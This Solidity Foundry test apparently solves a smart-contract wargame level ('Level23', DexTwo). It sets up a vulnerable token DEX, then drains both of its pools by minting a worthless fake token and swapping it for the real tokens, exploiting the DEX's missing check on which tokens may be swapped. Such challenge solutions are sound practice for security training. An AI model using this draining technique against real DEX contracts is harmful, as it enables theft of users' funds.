// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Level23.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract Level23Test is Test {
    DexTwo public target;
    address public token1;
    address public token2;

    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        VmSafe.Wallet memory deployer = vm.createWallet("deployer");
        target = new DexTwo();
        token1 = address(new SwappableTokenTwo(address(target), "T1", "T1", 110));
        token2 = address(new SwappableTokenTwo(address(target), "T2", "T2", 110));
        IERC20(token1).transfer(attacker.addr, 10);
        IERC20(token2).transfer(attacker.addr, 10);

        IERC20(token1).approve(address(target), 100);
        IERC20(token2).approve(address(target), 100);
        target.add_liquidity(token1, 100);
        target.add_liquidity(token2, 100);
        target.setTokens(token1, token2);
    }

    function test_exploit() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(address(target), attacker.addr);
        vm.stopPrank();

        uint256 balance1 = IERC20(target.token1()).balanceOf(address(target));
        uint256 balance2 = IERC20(target.token2()).balanceOf(address(target));

        uint256 attackerBalance1 = IERC20(target.token1()).balanceOf(attacker.addr);
        uint256 attackerBalance2 = IERC20(target.token2()).balanceOf(attacker.addr);

        console.log("Token1 in Dex", balance1);
        console.log("Token2 in Dex", balance2);
        console.log("Token1 Attacker", attackerBalance1);
        console.log("Token2 Attacker", attackerBalance2);

        assertTrue(balance1 == 0 && balance2 == 0);
    }

    function exploit(address _target, address _attacker) private {
        SwappableTokenTwo fakeToken = new SwappableTokenTwo(address(target), "T1", "T1", 1 ether);

        DexTwo dex = DexTwo(_target);
        IERC20 t1 = IERC20(dex.token1());
        IERC20 t2 = IERC20(dex.token2());

        uint256 balance1 = t1.balanceOf(_target);
        uint256 balance2 = t2.balanceOf(_target);

        fakeToken.approve(_target, type(uint256).max);
        fakeToken.transfer(_target, 1);
        dex.swap(address(fakeToken), address(t1), 1);
        dex.swap(address(fakeToken), address(t2), 2);
    }
}
